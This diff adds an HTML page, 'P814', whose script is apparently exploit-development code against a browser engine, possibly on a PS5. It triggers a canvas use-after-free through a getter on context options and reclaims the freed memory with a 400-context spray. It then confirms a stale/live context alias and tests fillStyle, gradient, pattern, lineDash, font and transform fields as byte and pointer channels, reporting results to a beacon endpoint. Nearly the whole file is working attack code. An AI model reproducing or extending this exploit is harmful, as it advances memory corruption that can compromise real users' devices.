@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P814</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
+.ok{color:#3fb950;} .fail{color:#f85149;} .info{color:#58a6ff;}
+</style>
+</head><body>
+<pre id="o">P814 — same-type alias + fillStyle/strokeStyle byte channel</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+
+var _bq=[];
+function bn(t,d){_bq.push([t,d||'']);}
+function flushBn(){
+  for(var i=0;i<_bq.length;i++){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/beacon.php?tag=P814-'+encodeURIComponent(_bq[i][0])+'&data='+encodeURIComponent(String(_bq[i][1]).slice(0,900))+'&t='+Date.now(),false);
+      x.send();
+    }catch(e){}
+  }
+  _bq=[];
+}
+function imgBn(t){var i=new Image();i.src='/beacon.php?tag=P814-'+t+'&t='+Date.now();}
+
+/* ========== PHASE 1: Canvas UAF + same-type reclaim ========== */
+
+var innerCtx=null;
+var canvas=document.createElement('canvas');
+canvas.width=1;canvas.height=1;
+var opts={};
+Object.defineProperty(opts,'alpha',{
+  get:function(){
+    innerCtx=canvas.getContext('2d');
+    return true;
+  }
+});
+canvas.getContext('bitmaprenderer',opts);
+
+if(!innerCtx){
+  imgBn('UAF-FAIL');
+  log('UAF trigger failed','fail');
+  setTimeout(function(){location.reload();},300);
+}else{
+
+/* Same-type spray */
+var SPRAY=400;
+var ctxs=[];
+var cans=[];
+for(var i=0;i<SPRAY;i++){
+  var c=document.createElement('canvas');
+  c.width=1;c.height=1;
+  var ctx=c.getContext('2d');
+  ctx.lineWidth=7777.77+i;
+  ctxs.push(ctx);
+  cans.push(c);
+}
+
+/* Check if stale reads from a spray context */
+var staleLW;
+try{staleLW=innerCtx.lineWidth;}catch(e){staleLW=-999;}
+
+if(staleLW<7777||staleLW>7777+SPRAY){
+  imgBn('RECLAIM-MISS_lw='+staleLW);
+  log('Same-type reclaim missed (lw='+staleLW+')','fail');
+  setTimeout(function(){location.reload();},300);
+}else{
+
+var aliasIdx=Math.round(staleLW-7777.77);
+log('Same-type reclaim OK! alias='+aliasIdx+' lw='+staleLW,'ok');
+imgBn('ALIAS-OK_idx='+aliasIdx);
+
+var stale=innerCtx;
+var live=ctxs[aliasIdx];
+
+/* ========== PHASE 2: Bidirectional alias verify ========== */
+live.lineWidth=8888.88;
+var check1=stale.lineWidth;
+stale.lineWidth=9999.99;
+var check2=live.lineWidth;
+bn('BIDIR','l2s='+(check1===8888.88)+'|s2l='+(check2===9999.99));
+log('Bidirectional: live→stale='+(check1===8888.88)+' stale→live='+(check2===9999.99),'info');
+
+/* ========== PHASE 3: fillStyle byte channel tests ========== */
+
+/* Test A: set color through live, read through stale */
+live.fillStyle='rgba(0xAA,0xBB,0xCC,0.502)';
+var fsA=stale.fillStyle;
+bn('FS-A','set=rgba(AA,BB,CC,0.5)|got='+fsA);
+log('fillStyle A: set rgba(AA,BB,CC,0.5) → got "'+fsA+'"','info');
+
+/* Test B: set arbitrary bytes */
+live.fillStyle='rgba(16,0,138,0.8)';
+var fsB=stale.fillStyle;
+bn('FS-B','set=rgba(16,0,138,0.8)|got='+fsB);
+log('fillStyle B: set rgba(16,0,138,0.8) → got "'+fsB+'"','info');
+
+/* Test C: strokeStyle */
+live.strokeStyle='rgba(255,128,64,0.314)';
+var ssC=stale.strokeStyle;
+bn('SS-C','set=rgba(255,128,64,0.314)|got='+ssC);
+log('strokeStyle C: set rgba(255,128,64,0.314) → got "'+ssC+'"','info');
+
+/* Test D: hex colors */
+live.fillStyle='#1a2b3c';
+var fsD=stale.fillStyle;
+bn('FS-D','set=#1a2b3c|got='+fsD);
+log('fillStyle D: set #1a2b3c → got "'+fsD+'"','info');
+
+/* ========== PHASE 4: Gradient pointer test ========== */
+/* Set fillStyle to gradient through live, read through stale */
+var grad=live.createLinearGradient(0,0,1,0);
+grad.addColorStop(0,'red');
+grad.addColorStop(1,'blue');
+live.fillStyle=grad;
+var fsGrad=stale.fillStyle;
+var isObj=(typeof fsGrad==='object');
+var isSame=(fsGrad===grad);
+bn('FS-GRAD','isObj='+isObj+'|isSame='+isSame+'|type='+typeof fsGrad);
+log('fillStyle gradient: isObj='+isObj+' isSame='+isSame+' type='+typeof fsGrad,'info');
+
+/* ========== PHASE 5: Pattern pointer test ========== */
+var patCanvas=document.createElement('canvas');
+patCanvas.width=2;patCanvas.height=2;
+var patCtx=patCanvas.getContext('2d');
+patCtx.fillStyle='#ff00ff';
+patCtx.fillRect(0,0,2,2);
+var pat=live.createPattern(patCanvas,'repeat');
+live.fillStyle=pat;
+var fsPat=stale.fillStyle;
+var isPatObj=(typeof fsPat==='object');
+var isPatSame=(fsPat===pat);
+bn('FS-PAT','isObj='+isPatObj+'|isSame='+isPatSame+'|type='+typeof fsPat);
+log('fillStyle pattern: isObj='+isPatObj+' isSame='+isPatSame+' type='+typeof fsPat,'info');
+
+/* ========== PHASE 6: setLineDash Vector allocation ========== */
+/* setLineDash forces the lineDash Vector to allocate a heap buffer */
+/* The Vector<double> at State+168 stores m_buffer, m_capacity, m_size */
+var dashArr=[];
+for(var d=0;d<100;d++)dashArr.push(d*0.1+1);
+live.setLineDash(dashArr);
+var gotDash=stale.getLineDash();
+var dashMatch=(gotDash.length===100);
+var dashFirst=(gotDash.length>0)?gotDash[0]:null;
+var dashLast=(gotDash.length>0)?gotDash[gotDash.length-1]:null;
+bn('DASH','len='+gotDash.length+'|match='+dashMatch+'|first='+dashFirst+'|last='+dashLast);
+log('setLineDash: set 100 entries, got '+gotDash.length+' back, match='+dashMatch,'info');
+
+/* Test: can we read lineDash values that were set through the other side? */
+stale.setLineDash([42.42,84.84,126.126]);
+var gotDash2=live.getLineDash();
+var dash2Match=(gotDash2.length===3 && gotDash2[0]===42.42);
+bn('DASH-BIDIR','len='+gotDash2.length+'|match='+dash2Match+'|vals='+gotDash2.join(','));
+log('lineDash bidir: set [42.42,84.84,126.126] → got ['+gotDash2.join(',')+'] match='+dash2Match,'info');
+
+/* ========== PHASE 7: save/restore stack depth test ========== */
+/* How deep can we push the state stack? */
+/* At some depth, Vector reallocates from inline to heap buffer */
+var saveOK=true;
+var saveDepth=0;
+for(var s=0;s<20;s++){
+  try{
+    live.save();
+    saveDepth++;
+    live.lineWidth=1000+s;
+  }catch(e){saveOK=false;break;}
+}
+/* Check we can read through stale */
+var deepLW;
+try{deepLW=stale.lineWidth;}catch(e){deepLW=-1;}
+bn('SAVE-DEPTH','depth='+saveDepth+'|lw='+deepLW+'|expectedLW='+(1000+saveDepth-1));
+log('save depth='+saveDepth+' lw='+deepLW+' (expected '+(1000+saveDepth-1)+')','info');
+
+/* Restore all */
+for(var r=0;r<saveDepth;r++){
+  try{live.restore();}catch(e){break;}
+}
+
+/* ========== PHASE 8: Font string test ========== */
+/* Font is a complex field with a FontProxy pointer */
+live.font='20px serif';
+var gotFont;
+try{gotFont=stale.font;}catch(e){gotFont='ERR:'+e.message;}
+bn('FONT','set=20px serif|got='+gotFont);
+log('font: set "20px serif" → got "'+gotFont+'"','info');
+
+live.font='bold 16px monospace';
+var gotFont2;
+try{gotFont2=stale.font;}catch(e){gotFont2='ERR:'+e.message;}
+bn('FONT2','set=bold 16px monospace|got='+gotFont2);
+log('font2: set "bold 16px monospace" → got "'+gotFont2+'"','info');
+
+/* ========== PHASE 9: getTransform test ========== */
+live.setTransform(1.1,2.2,3.3,4.4,5.5,6.6);
+var tf;
+try{
+  tf=stale.getTransform();
+  bn('TF','a='+tf.a+'|b='+tf.b+'|c='+tf.c+'|d='+tf.d+'|e='+tf.e+'|f='+tf.f);
+  log('transform: ['+[tf.a,tf.b,tf.c,tf.d,tf.e,tf.f].join(', ')+']','info');
+}catch(e){
+  bn('TF-ERR',e.message);
+  log('transform error: '+e.message,'fail');
+}
+
+/* ========== PHASE 10: measureText info test ========== */
+live.font='16px serif';
+var metrics;
+try{
+  metrics=stale.measureText('ABCDEFGHIJ');
+  bn('MEASURE','w='+metrics.width);
+  log('measureText width='+metrics.width,'info');
+
+  /* Check for advanced metrics (PS5 may have fontBoundingBoxAscent etc.) */
+  var mKeys=[];
+  for(var k in metrics){mKeys.push(k+'='+metrics[k]);}
+  if(mKeys.length>1){
+    bn('MEASURE-FULL',mKeys.join('|'));
+    log('measureText keys: '+mKeys.join(', '),'info');
+  }
+}catch(e){
+  bn('MEASURE-ERR',e.message);
+  log('measureText error: '+e.message,'fail');
+}
+
+/* ========== DONE ========== */
+bn('DONE','aliasIdx='+aliasIdx);
+flushBn();
+log('','');
+log('=== P814 COMPLETE ===','ok');
+log('Key findings:','info');
+log('1. fillStyle color bytes survive alias: '+fsA,'');
+log('2. Gradient pointer through alias: isObj='+isObj+' same='+isSame,'');
+log('3. Pattern pointer through alias: isObj='+isPatObj+' same='+isPatSame,'');
+log('4. setLineDash 100 entries bidir: '+dashMatch,'');
+log('5. Save stack depth: '+saveDepth,'');
+
+}} /* close the else blocks */
+</script></body></html>
